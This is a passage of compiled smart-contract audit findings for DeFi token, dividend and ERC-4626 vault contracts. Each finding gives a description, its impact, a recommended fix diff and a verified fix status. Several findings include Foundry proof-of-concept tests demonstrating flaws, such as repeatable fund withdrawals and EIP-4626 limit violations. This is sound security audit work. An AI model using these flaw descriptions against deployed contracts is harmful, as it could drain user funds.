**Remora:** Fixed in commit [91aed23](https://github.com/remora-projects/remora-smart-contracts/commit/91aed23b0a372a0aa3a7eac6e8e4a98563cea615) by adding a note noting it is intended for future use.

**Cyfrin:** Verified.

## [M-74] `Token Bank::remove Token` reverts when token balance is zero, making it impossible to remove tokens from the `developments` array
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** When removing a token from the TokenBank, the removal attempt reverts if it has zero tokens on the TokenBank balance. As time passes the `developments` array will grow having unnecessary tokens inside it that are impossible to remove.

**Impact:** The `developments` array will continue to grow leading to unnecessary waste of gas when claiming fees.

**Recommended Mitigation:** Before calling `withdrawTokens()`, check if the tokenAddress' balance is 0, if so, skip the call (it would anyways revert):
```diff
    function removeToken(address tokenAddress) external restricted {
        ...
-        withdrawTokens(tokenAddress, custodialWallet, 0);
+       if(IERC20(tokenAddress).balanceOf(address(this)) > 0) withdrawTokens(tokenAddress, custodialWallet, 0);
        ...
    }
```

**Remora:** Fixed in commit [2e797fc](https://github.com/remora-projects/remora-smart-contracts/commit/2e797fc45245e3cc731e7f2f70401e8df831f1f3).

**Cyfrin:** Verified.

## [M-75] `Token Bank::withdraw Funds` resets `memory` not `storage` fee and sale amounts allowing multiple withdraws for the same token
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `TokenBank::withdrawFunds` resets `memory` not `storage` fee and sale amounts allowing multiple withdraws for the same token:
```solidity
    function withdrawFunds(
        address tokenAddress,
        bool fee
    ) public nonReentrant restricted {
        TokenData memory curData = tokenData[tokenAddress];
        address to;
        uint64 amount;
        if (fee) {
            to = custodialWallet;
            amount = curData.feeAmount;
            curData.feeAmount = 0; // @audit resets memory not storage
        } else {
            to = curData.withdrawTo;
            amount = curData.saleAmount;
            curData.saleAmount = 0; // @audit resets memory not storage
        }
        if (amount != 0) IERC20(stablecoin).transfer(to, amount);

        if (fee) emit FeesClaimed(tokenAddress, amount);
        else emit FundsClaimed(tokenAddress, amount);
    }
```

**Impact:** The admin can make multiple fee and sale amount withdraws for the same token address. This will work as long as there are sufficient fee and sale tokens from other sales.

**Recommended Mitigation:** Reset `storage` not `memory`:
```diff
    function withdrawFunds(
        address tokenAddress,
        bool fee
    ) public nonReentrant restricted {
        TokenData memory curData = tokenData[tokenAddress];
        address to;
        uint64 amount;
        if (fee) {
            to = custodialWallet;
            amount = curData.feeAmount;
-           curData.feeAmount = 0;
+           tokenData[tokenAddress].feeAmount = 0;
        } else {
            to = curData.withdrawTo;
            amount = curData.saleAmount;
-           curData.saleAmount = 0;
+           tokenData[tokenAddress].saleAmount = 0;
        }
        if (amount != 0) IERC20(stablecoin).transfer(to, amount);

        if (fee) emit FeesClaimed(tokenAddress, amount);
        else emit FundsClaimed(tokenAddress, amount);
    }
```

**Remora:** Fixed in commit [571bfe4](https://github.com/remora-projects/remora-smart-contracts/commit/571bfe4b3129d1acaee62e323a3165c7b1c0f3d1).

**Cyfrin:** Verified.

## [M-76] Emit missing events for storage changes
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Emit missing events for storage changes:
* `Allowlist::changeUserAccreditation`, `changeAdminStatus`
* `Allowlist::UserAllowed` should be expanded to contain and emit the `HolderInfo` boolean flags
* `ReferralManager::addReferral`
* `RemoraIntermediary::setFundingWallet`, `setFeeRecipient`
* `TokenBank::changeReferralManager`, `changeStablecoin`, `changeCustodialWallet`
* `TokenBank::TokensWithdrawn` should include withdrawn `amount`
* `DividendManager::setPayoutForwardAddress`, `changeWallet`
* `RemoraToken::addToWhitelist`, `removeFromWhitelist`, `updateAllowList`
* `PaymentSettler::withdraw`, `withdrawAllFees` should emit amount withdrawn, `addToken`, `changeCustodian`,  `changeStablecoin`

**Remora:** Fixed in commit [9051af8](https://github.com/remora-projects/remora-smart-contracts/commit/9051af840f92c7aee37b95a4d8f206d0f16abc93).

**Cyfrin:** Verified.

## [M-77] Forwarders who aren't also holders are unable to claim forwarded payouts
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Forwarders who aren't also holders are unable to claim forwarded payouts due to this check in `DividendManager::payoutBalance`:
```solidity
    function payoutBalance(address holder) public returns (uint256) {
        HolderManagementStorage storage $ = _getHolderManagementStorage();
        HolderStatus memory rHolderStatus = $._holderStatus[holder];
        uint16 currentPayoutIndex = $._currentPayoutIndex;

        if (
             // @audit must be a holder to claim payouts, prevents forwarders who aren't
             // also holders from claiming their forwarded payouts
            (!rHolderStatus.isHolder) || //non-holder calling the function
            (rHolderStatus.isFrozen && rHolderStatus.frozenIndex == 0) || //user has been frozen from the start, thus no payout
            rHolderStatus.lastPayoutIndexCalculated == currentPayoutIndex // user has already been paid out up to current payout index
        ) return 0;
```

**Impact:** Forwarders who aren't also holders are unable to claim forwarded payouts.

**Recommended Mitigation:** Remove the `(!rHolderStatus.isHolder)` check in `DividendManager::payoutBalance`.

**Remora:** Fixed in commit [82fd5d1](https://github.com/remora-projects/remora-smart-contracts/commit/82fd5d1a7d2c6c54790638d63d748eeb8efc870e).

**Cyfrin:** Verified.

\clearpage

## [M-78] Remove `< 0` comparison for unsigned integers
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Unsigned integers can't be `< 0` so this comparison should be removed:
`PledgeManager.sol`:
```diff
-        if (numTokens <= 0 || _propertyToken.balanceOf(signer) < numTokens)
+        if (numTokens == 0 || _propertyToken.balanceOf(signer) < numTokens)
```

**Remora:** Fixed in commit [6be4660](https://github.com/remora-projects/remora-smart-contracts/commit/6be4660990ebafbb7200425978f078a0865732fe).

**Cyfrin:** Verified.

## [M-79] Rename `is Allowed` to `was Allowed` in `Allowlist::allow User`, `disallow User`
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `Allowlist::allowUser`, `disallowUser` return the existing `allowed` status into a named return variable called `isAllowed`, before potentially modifying the `allowed` status.

Since these functions can modify the `allowed` status, the named return variable should be renamed to `wasAllowed` to explicitly indicate the returned status may not be current.

**Remora:** Fixed in commit [06d17a6](https://github.com/remora-projects/remora-smart-contracts/commit/06d17a68320472e44a46c59ff3623af3741f691a).

**Cyfrin:** Verified.

## [M-80] Use `EIP712Upgradeable` library to simplify `Document Manager`
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Use [`EIP712Upgradeable`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/utils/cryptography/EIP712Upgradeable.sol) library to simplify `DocumentManager` as this library provides the domain separator and the helpful function `_hashTypedDataV4`.

Inherit from `EIP712Upgradeable`, remove all the duplicate code which it provides then in `verifySignature` do this:
```diff
-        bytes32 digest = keccak256(
-            abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash)
-        );
+        bytes32 digest = _hashTypedDataV4(structHash);
```

**Remora:** Fixed in commit [b545498](https://github.com/remora-projects/remora-smart-contracts/commit/b545498ed931eb63ae0ec7f6fb3297ce25886281).

**Cyfrin:** Verified.

## [M-81] Use `Safe ERC20` functions instead of standard `ERC20` transfer functions
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Use [`SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) functions instead of standard `ERC20` transfer functions:

```solidity
$ rg "transferFrom" && rg "transfer\("
RWAToken/DividendManager.sol
317:        $._stablecoin.transferFrom(

RWAToken/RemoraToken.sol
220:     * @dev Calls OpenZeppelin ERC20Upgradeable transferFrom function.
251:        return super.transferFrom(from, to, value);
344:            $._stablecoin.transferFrom(sender, $._wallet, _transferFee);
352:     * @dev Calls OpenZeppelin ERC20Upgradeable transferFrom function.
358:    function transferFrom(
376:            $._stablecoin.transferFrom(sender, $._wallet, _transferFee);
379:        return super.transferFrom(from, to, value);

TokenBank.sol
261:        IERC20(stablecoin).transferFrom(

PledgeManager.sol
196:        IERC20(stablecoin).transferFrom(

RemoraIntermediary.sol
172:        IERC20(data.assetReceived).transferFrom(
177:        IERC20(data.assetSold).transferFrom(
197:        IERC20(data.assetReceived).transferFrom(
238:        IERC20(data.paymentToken).transferFrom(
269:            IERC20(data.paymentToken).transferFrom(
296:        IERC20(data.paymentToken).transferFrom(
331:        IERC20(token).transferFrom(payer, recipient, amount);
RWAToken/DividendManager.sol
409:            $._stablecoin.transfer(holder, payoutAmount);
429:        stablecoin.transfer($._wallet, valueToClaim);

RWAToken/RemoraToken.sol
401:        $._stablecoin.transfer(account, burnPayout);

TokenBank.sol
185:        IERC20(tokenAddress).transfer(to, amount);
206:        if (amount != 0) IERC20(stablecoin).transfer(to, amount);
237:        IERC20(stablecoin).transfer(custodialWallet, totalValue);
266:        IERC20(tokenAddress).transfer(to, amount);

PledgeManager.sol
237:                _stablecoin.transfer(feeWallet, feeValue);
239:            _stablecoin.transfer(destinationWallet, amount);
299:        IERC20(stablecoin).transfer(signer, _fixDecimals(refundAmount + fee));
```

**Remora:** Fixed in commit [f2f3f7e](https://github.com/remora-projects/remora-smart-contracts/commit/f2f3f7e8d51a018417615207152d9fbadf8484eb).

**Cyfrin:** Verified.

## [M-82] Zero token transfers record receiving user as a holder in `Dividend Manager::Holder Status` even if they have zero token balance
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Zero token transfers record receiving user as a holder in `DividendManager::HolderStatus` even if they have zero token balance.

**Proof of Concept:** First add these two functions in `DividendManager`:
```solidity
function getCurrentPayoutIndex() view external returns(uint8 currentPayoutIndex) {
    currentPayoutIndex = _getHolderManagementStorage()._currentPayoutIndex;
}

function getHolderStatus(address holder) view external returns(HolderStatus memory status) {
    status = _getHolderManagementStorage()._holderStatus[holder];
}
```

Then the PoC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {RemoraToken, DividendManager} from "../../../contracts/RWAToken/RemoraToken.sol";
import {Stablecoin} from "../../../contracts/ForTestingOnly/Stablecoin.sol";
import {AccessManager} from "../../../contracts/AccessManager.sol";
import {Allowlist} from "../../../contracts/Allowlist.sol";

import {UnitTestBase} from "../UnitTestBase.sol";

import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract RemoraTokenTest is UnitTestBase {
    // contract being tested
    RemoraToken remoraTokenProxy;
    RemoraToken remoraTokenImpl;

    // required support contracts & variables
    Stablecoin internal stableCoin;
    AccessManager internal accessMgrProxy;
    AccessManager internal accessMgrImpl;
    Allowlist internal allowListProxy;
    Allowlist internal allowListImpl;
    address internal withdrawalWallet;
    uint32 internal constant DEFAULT_PAYOUT_FEE = 100_000; // 10%

    function setUp() public override {
        // test harness setup
        UnitTestBase.setUp();

        // support contracts / variables setup
        stableCoin = new Stablecoin("USDC", "USDC", type(uint256).max/1e6, 6);
        assertEq(stableCoin.balanceOf(address(this)), type(uint256).max/1e6*1e6);

        // contract being tested setup
        accessMgrImpl = new AccessManager();
        ERC1967Proxy proxy1 = new ERC1967Proxy(address(accessMgrImpl), "");
        accessMgrProxy = AccessManager(address(proxy1));
        accessMgrProxy.initialize(address(this));

        allowListImpl = new Allowlist();
        ERC1967Proxy proxy2 = new ERC1967Proxy(address(allowListImpl), "");
        allowListProxy = Allowlist(address(proxy2));
        allowListProxy.initialize(address(accessMgrProxy), address(this));

        withdrawalWallet = makeAddr("WITHDRAWAL_WALLET");

        // contract being tested setup
        remoraTokenImpl = new RemoraToken();
        ERC1967Proxy proxy3 = new ERC1967Proxy(address(remoraTokenImpl), "");
        remoraTokenProxy = RemoraToken(address(proxy3));
        remoraTokenProxy.initialize(
            address(this), // tokenOwner
            address(accessMgrProxy), // initialAuthority
            address(stableCoin),
            withdrawalWallet,
            address(allowListProxy),
            "REMORA",
            "REMORA",
            0
        );

        assertEq(remoraTokenProxy.authority(), address(accessMgrProxy));
    }

    function test_transferZeroTokens_RegistersHolderWithDividendManager() external {
        address user1 = users[0];
        address user2 = users[1];

        uint256 user1RemoraTokens = 1;

        // whitelist both users
        remoraTokenProxy.addToWhitelist(user1);
        assertTrue(remoraTokenProxy.isWhitelisted(user1));
        remoraTokenProxy.addToWhitelist(user2);
        assertTrue(remoraTokenProxy.isWhitelisted(user2));

        // mint user1 their tokens
        remoraTokenProxy.mint(user1, user1RemoraTokens);
        assertEq(remoraTokenProxy.balanceOf(user1), user1RemoraTokens);

        // allowlist both users
        allowListProxy.allowUser(user1, true, true, false);
        assertTrue(allowListProxy.allowed(user1));
        allowListProxy.allowUser(user2, true, true, false);
        assertTrue(allowListProxy.allowed(user2));
        assertTrue(allowListProxy.exchangeAllowed(user1, user2));

        // user1 transfers zero tokens to user2
        vm.prank(user1);
        remoraTokenProxy.transfer(user2, 0);

        // fetch user2's HoldStatus from DividendManager
        DividendManager.HolderStatus memory user2Status = remoraTokenProxy.getHolderStatus(user2);

        // user2 is listed as a holder even though they have no tokens!
        assertEq(user2Status.isHolder, true);
        assertEq(remoraTokenProxy.balanceOf(user2), 0);
    }
}
```

**Recommended Mitigation:** Either revert on zero token transfers inside `RemoraToken::_update` or change `DividendManager::_updateHolders` to not set `to` as a holder if their balance is zero.

**Remora:** Fixed in commit [0a2dea2](https://github.com/remora-projects/remora-smart-contracts/commit/0a2dea21b8dec5fa63dd2402b987b4f77c3e60b1).

**Cyfrin:** Verified.

## [M-83] Only update `deployed Assets` when `remaining > 0` in `Accountable Yield::repay`
- Severity: `Medium`
- Source report: `pr50.md`

### Detailed Content (from source)
**Description:** In `AccountableYield::repay`, `deployedAssets` is read and conditionally reduced unconditionally:

```solidity
uint256 deployed = deployedAssets;
deployedAssets -= Math.min(remaining, deployed);
```

However, this has no effect when `remaining == 0` (since `Math.min(0, deployed) == 0`). You already branch on `remaining > 0` immediately after for principal reduction:
```solidity
// Reduce outstanding principal
if (remaining > 0) {
     uint256 outstanding = _loan.outstandingPrincipal;
    _loan.outstandingPrincipal = outstanding > remaining ? outstanding - remaining : 0;
}
```

Consider reducing `deployedAssets` inside the existing `if (remaining > 0)` block to avoid an unnecessary storage read and write when there is no remaining repayment amount:
```solidity
// Reduce deployedAssets and outstanding principal
if (remaining > 0) {
    // Assets are moving from external → vault
    uint256 deployed = deployedAssets;
    deployedAssets -= Math.min(remaining, deployed);

     uint256 outstanding = _loan.outstandingPrincipal;
    _loan.outstandingPrincipal = outstanding > remaining ? outstanding - remaining : 0;
}
```

**Accountable:** Fixed in commit [`eec49ac`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/eec49ac44951a81228d0cd759b429f0ba13c5772)

**Cyfrin:** Verified.

## [M-84] `Meta Vault::redeem` erroneously calls `ERC4626Upgradeable::withdraw` when attempting to redeem `USDe` from `p USDe Vault`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** Unlike `MetaVault::deposit`, `MetaVault::mint`, and `MetaVault::withdraw` which all invoke the corresponding `IERC4626` function, `MetaVault::redeem` erroneously calls `ERC4626Upgradeable::withdraw` when attempting to redeem `USDe` from `pUSDeVault`:

```solidity
function redeem(address token, uint256 shares, address receiver, address owner) public virtual returns (uint256) {
    if (token == asset()) {
        return withdraw(shares, receiver, owner);
    }
    ...
}
```

**Impact:** The behavior of `MetaVault::redeem` differs from that which is expected depending on whether `token` is specified as `USDe` or one of the other supported vault tokens.

**Recommended Mitigation:**
```diff
    function redeem(address token, uint256 shares, address receiver, address owner) public virtual returns (uint256) {
        if (token == asset()) {
--          return withdraw(shares, receiver, owner);
++          return redeem(shares, receiver, owner);
        }
        ...
    }
```

**Strata:** Fixed in commit [7665e7f](https://github.com/Strata-Money/contracts/commit/7665e7f3cd44d8a025f555737677d2014f4ac8a8).

**Cyfrin:** Verified.

## [M-85] `Meta Vault::redeem Required Base Assets` should be able to redeem small amounts from each vault to fill requested amount and avoid redeeming more than requested
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** `MetaVault::redeemRequiredBaseAssets` is supposed to iterate through the supported vaults, redeeming assets until the required amount of base assets is obtained:
```solidity
/// @notice Iterates through supported vaults and redeems assets until the required amount of base tokens is obtained
```

Its implementation however only retrieves from a supported vault if that one withdrawal can satisfy the desired amount:
```solidity
function redeemRequiredBaseAssets (uint baseTokens) internal {
    for (uint i = 0; i < assetsArr.length; i++) {
        IERC4626 vault = IERC4626(assetsArr[i].asset);
        uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));
        // @audit only withdraw if a single withdraw can satisfy desired amount
        if (totalBaseTokens >= baseTokens) {
            vault.withdraw(baseTokens, address(this), address(this));
            break;
        }
    }
}
```

**Impact:** This has a number of potential problems:
1) if no single withdraw can satisfy the desired amount, then the calling function will revert due to insufficient funds even if the desired amount could be satisfied by multiple smaller withdrawals from different supported vaults
2) a single withdraw may be greater than the desired amount, leaving `USDe` tokens inside the vault contract. This is suboptimal as then they would not be earning yield by being staked in `sUSDe`, and there appears to be no way for the contract owner to trigger the staking once the yield phase has started, since supporting vaults can be added and deposits for them work during the yield phase

**Recommended Mitigation:** `MetaVault::redeemRequiredBaseAssets` should:
* keep track of the total currently redeemed amount
* calculate the remaining requested amount as the requested amount minus the total currently redeemed amount
* if the current vault is not able to redeem the remaining requested amount, redeem as much as possible and increase the total currently redeemed amount by the amount redeemed
* if the current vault could redeem more than the remaining requested amount, redeem only enough to satisfy the remaining requested amount

The above strategy ensures that:
* small amounts from multiple vaults can be used to fulfill the requested amount
* greater amounts than requested are not withdrawn, so no `USDe` tokens remain inside the vault unable to be staked and not earning yield

**Strata:** Fixed in commits [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298), [7e6e859](https://github.com/Strata-Money/contracts/commit/7e6e8594c05ea7e3837ddbe7395b4a15ea34c7e9).

**Cyfrin:** Verified.

## [M-86] `Pre Deposit Vault::initialize` should not be exposed as public
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** `PreDepositVault::initialize` is currently exposed as public. Based on the `pUSDeVault` and `yUSDeVault` implementations that invoke this super function, it is not intended. While this does not appear to be exploitable or cause any issues that prevent initialization, it would be better to mark this base implementation as internal and use the `onlyInitializing` modifier instead.

```diff
    function initialize(
        address owner_
        , string memory name
        , string memory symbol
        , IERC20 USDe_
        , IERC4626 sUSDe_
        , IERC20 stakedAsset
--  ) public virtual initializer {
++  ) internal virtual onlyInitializing {
        __ERC20_init(name, symbol);
        __ERC4626_init(stakedAsset);
        __Ownable_init(owner_);

        USDe = USDe_;
        sUSDe = sUSDe_;
    }
```

**Strata:** Fixed in commits [6ac05c2](https://github.com/Strata-Money/contracts/commit/6ac05c232a47de6e9935fd6e20af1f0c4540c457) and [def7d36](https://github.com/Strata-Money/contracts/commit/def7d360225f49662c73bf968d63d935c82d9d0e).

**Cyfrin:** Verified. `PreDepositVault::initialize` is now marked as internal and uses the `onlyInitializing` modifier.

## [M-87] `p USDe Vault::max Redeem` doesn't account for redemption pausing, in violation of EIP-4626 which can break protocols integrating with `p USDe Vault`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxRedeem`:
> MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0.

`pUSDeVault::maxRedeem` doesn't account for redemption pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`. `MetaVault::redeem` uses `_withdraw` so redemptions will be paused when withdrawals are paused.

**Proof of Concept:**
```solidity
function test_maxRedeem_WhenWithdrawalsPaused() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin pauses withdrawals
    pUSDe.setWithdrawalsEnabled(false);

    // doesn't revert but it should since `MetaVault::redeem` uses `_withdraw`
    // and withdraws are paused, so `maxRedeem` should return 0
    assertEq(pUSDe.maxRedeem(user1), user1AmountInMainVault);

    // reverts with WithdrawalsDisabled
    vm.prank(user1);
    pUSDe.redeem(user1MainVaultShares, user1, user1);

    // https://eips.ethereum.org/EIPS/eip-4626 maxRedeem says:
    // MUST factor in both global and user-specific limits,
    // like if redemption are entirely disabled (even temporarily) it MUST return 0
}
```

**Recommended Mitigation:** When withdrawals are paused, `maxRedeem` should return 0. The override of `maxRedeem` should likely be done in `PreDepositVault` because there is where the pausing is implemented.

**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).

**Cyfrin:** Verified.

## [M-88] `p USDe Vault::max Withdraw` doesn't account for withdrawal pausing, in violation of EIP-4626 which can break protocols integrating with `p USDe Vault`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxWithdraw`:
> MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return 0.

`pUSDeVault::maxWithdraw` doesn't account for withdrawal pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`.

**Proof of Concept:**
```solidity
function test_maxWithdraw_WhenWithdrawalsPaused() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin pauses withdrawals
    pUSDe.setWithdrawalsEnabled(false);

    // reverts as maxWithdraw returns user1AmountInMainVault even though
    // attempting to withdraw would revert
    assertEq(pUSDe.maxWithdraw(user1), 0);

    // https://eips.ethereum.org/EIPS/eip-4626 maxWithdraw says:
    // MUST factor in both global and user-specific limits,
    // like if withdrawals are entirely disabled (even temporarily) it MUST return 0
}
```

**Recommended Mitigation:** When withdrawals are paused, `maxWithdraw` should return 0. The override of `maxWithdraw` should likely be done in `PreDepositVault` because there is where the pausing is implemented.

**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).

**Cyfrin:** Verified.

## [M-89] `y USDe Vault` inherits from `Pre Deposit Vault` but doesn't call `on After Deposit Checks` or `on After Withdrawal Checks`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** `pUSDeVault` and `yUSDeVault` both inherit from `PreDepositVault`.

`pUSDeVault` uses `PreDepositVault::onAfterDepositChecks` and `onAfterWithdrawalChecks` inside its overriden `_deposit` and `_withdraw` functions.

However `yUSDeVault` doesn't do this; instead it attempts to re-implement the same code as these functions inside its `_deposit` and `_withdraw`, but omits this code from `onAfterWithdrawalChecks`:
```solidity
if (totalSupply() < MIN_SHARES) {
    revert MinSharesViolation();
}
```

**Impact:** The `MIN_SHARES` check won't be enforced in `yUSDeVault`.

**Recommended Mitigation:** Use `PreDepositVault::onAfterDepositChecks` and `onAfterWithdrawalChecks` inside `yUSDeVault::_deposit` and `_withdraw`.

Alternatively if the omission of the `MIN_SHARES` check is intentional, then add a boolean parameter to `onAfterWithdrawalChecks` whether to perform the check or not so that `yUSDeVault` can use the two functions it inherits to reduce code duplication.

**Strata:** Fixed in commits [3f02ce5](https://github.com/Strata-Money/contracts/commit/3f02ce5c1076cbcab8943eae320ecfd590c1f634), [0812d57](https://github.com/Strata-Money/contracts/commit/0812d57f006d4cf3606b7a9c99bbbdf576c4e089).

**Cyfrin:** Verified.

## [M-90] Disable initializers on upgradeable contracts
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** Disable initializers on upgradeable contracts:
* `yUSDeVault`
* `yUSDeDepositor`
* `pUSDeVault`
* `pUSDeDepositor`

```diff
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+       _disableInitializers();
+    }
```

**Strata:** Fixed in commit [49060b2](https://github.com/Strata-Money/contracts/commit/49060b25230389feff54597a025a7aa129ceb9f3).

**Cyfrin:** Verified.

## [M-91] Don't initialize to default values
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** Don't initialize to default values as Solidity already does this:
```solidity
predeposit/MetaVault.sol
220:        for (uint i = 0; i < length; i++) {
241:        for (uint i = 0; i < assetsArr.length; i++) {
```

**Strata:** Fixed in commit [07b471f](https://github.com/Strata-Money/contracts/commit/07b471f8292d62098ee4ffd97e62d6f0854d96ce).

**Cyfrin:** Verified.

## [M-92] Inability to remove and redeem from vaults with withdrawal issues could result in a bank-run
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** When deposits are made to the `pUSDeVault`, `depositedBase` is incremented based on the previewed quote amount of USDe underlying the external ERC-4626 vaults; however, these instantaneous preview quotes are not necessarily accurate when compared to the maximum amount that is actually withdrawable. For example, `MetaVault::deposit` implements calculation of the base USDe assets as:

```solidity
uint baseAssets = IERC4626(token).previewRedeem(tokenAssets);
```

But if the vault has overridden the max withdraw/redeem functions with custom logic that apply some limits then this previewed value could be larger than the actual maximum withdrawable USDe amount. This is possible because the ERC-4626 specification states that preview functions must not account for withdrawal/redemption limits like those returned from maxWithdraw/maxRedeem and should always act as though the redemption would be accepted.

Therefore, given that there is not actually a withdrawal that is executed during the deposit, the `depositedBase` state is incremented assuming the underlying USDe if fully redeemable, but it is not until removing and redeeming the vault that a revert could arise if the third-party vault malfunctions or restricts withdrawals. Currently, the only way to pause new deposits for a given vault is by removing the asset from the supported list; however, doing so also triggers a withdrawal of USDe which can fail for the reasons stated above, preventing the asset from being removed.

While none of the externally-supported vault tokens intend to function with a decrease in share price, it is of course not possible except in very simplistic implementations to rule out the possibility of a smart contract hack in which the underlying USDe is stolen from one of the supported vaults. Combined with the issue above, given that users are free to withdraw into a any supported vault token regardless of those that they supplied, full withdraw by other users into unaffected vault tokens (or even if the required USDe is pulled from these vaults by `MetaVault::redeemRequiredBaseAssets` to process their withdrawals), this could result in a subset of users being left with the bad debt rather than it being amortized.

It is understood that the protocol team has strict criteria for supporting new third-party vaults, including the need for instant withdrawals, no limits, no cooldowns, and not pausable, though exceptions may be made for partners that maintain robust communication channels regarding development plans and updates.

**Impact:** The inability to remove and redeem from vaults with withdrawal issues could result in a bank-run that leaves a subset of users with un-redeemable tokens.

**Recommended Mitigation:** Implement some mechanism to disable new deposits to a vault without having to remove it and (attempt to) fully-redeem the underlying tokens. To amortize any losses a potential faulty vault, it may be necessary to track the individual vault contributions to `depositedBase` and so that they can be negated from redemption calculations.

**Strata:** Fixed in commit [ae71893](https://github.com/Strata-Money/contracts/commit/ae718938d56ac581e9479e2831e5b75c67dda738).

**Cyfrin:** Verified.

## [M-93] Missing zero deposit amount validation
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** Unlike `pUSDeDepositor::deposit_USDe`, `pUSDeDepositor::deposit_sUSDe` does not enforce that the deposited amount is non zero:

```solidity
require(amount > 0, "Deposit is zero");
```

A similar case is present when comparing `yUSDeDepositor::deposit_pUSDeDepositor` and `yUSDeDepositor::deposit_pUSDe`.

**Strata:** Fixed in commit [1378b6a](https://github.com/Strata-Money/contracts/commit/1378b6af08e60aaa768693a9332e98dbb4f01776).

**Cyfrin:** Verified.

## [M-94] No way to compound deposited supported vault assets into `s USDe` stake during yield phase
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** Once the yield phase has been enabled, `pUSDeVault` still allows new supported vaults to be added and deposits via supported vaults.

However for supported vaults which are not `sUSDe`, there is no way to withdraw their base token `USDe` and compound into the `sUSDe` vault stake used by the `pUSDeVault` vault.

**Recommended Mitigation:** Either don't allow supported vaults to be added apart from `sUSDe` once yield phase has been enabled, or implement a function to withdraw their base token and compound it into the main stake.

**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.

**Cyfrin:** Verified.

## [M-95] Upgradeable contracts which are inherited from should use ERC7201 namespaced storage layouts or storage gaps to prevent storage collision
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** The protocol has upgradeable contracts which other contracts inherit from. These contracts should either use:
* [ERC7201](https://eips.ethereum.org/EIPS/eip-7201) namespaced storage layouts - [example](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L60-L72)
* storage gaps (though this is an [older and no longer preferred](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-5.0#Namespaced) method)

The ideal mitigation is that all upgradeable contracts use ERC7201 namespaced storage layouts.

Without using one of the above two techniques storage collision can occur during upgrades.

**Strata:** Fixed in commit [98068bd](https://github.com/Strata-Money/contracts/commit/98068bd9d9d435b37ce8f855f45b61d37aa274db).

**Cyfrin:** Verified.

## [M-96] Use explicit sizes instead of `uint`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** While `uint` defaults to `uint256`, it is considered good practice to use the explicit types including the size and to avoid using `uint`:
```solidity
predeposit/yUSDeDepositor.sol
65:        uint beforeAmount = asset.balanceOf(address(this));
73:        uint pUSDeShares = pUSDeDepositor.deposit(asset, amount, address(this));

predeposit/MetaVault.sol
53:        uint baseAssets = IERC4626(token).previewRedeem(tokenAssets);
54:        uint shares = previewDeposit(baseAssets);
70:        uint baseAssets = previewMint(shares);
